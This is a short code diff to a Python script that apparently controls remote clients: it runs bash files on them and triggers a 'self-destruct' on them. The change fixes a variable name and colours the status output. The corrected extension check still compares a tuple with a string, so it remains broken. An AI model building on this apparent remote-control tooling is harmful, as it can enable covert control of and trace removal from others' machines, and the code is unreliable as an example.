@@ -169,7 +169,7 @@ def start_process(client, Id):
         print("Client is running linux")
         print("Only bash(.sh) files are supported\n")
         path_dir = input("Enter file directory : ")
-        if os.path.splitext(path) != '.sh':
+        if os.path.splitext(path_dir) != '.sh':
             print("Specified file is not a bash(.sh) file")
             return
     else:
@@ -346,10 +346,10 @@ def self_destruct(client, Id, ip):
                 if msg == '<END>':
                     break
                 if msg[5:] == 'ERROR':
-                    print('[-]', msg)
+                    print(f'{g.r}[-]{g.e}', msg)
                     print()
                     return False
-                print('[+]', msg)
+                print(f'{g.y}[+]{g.e}', msg)
             print()
             print(f"{g.info} Self-Destruction completed successfully")
             print()
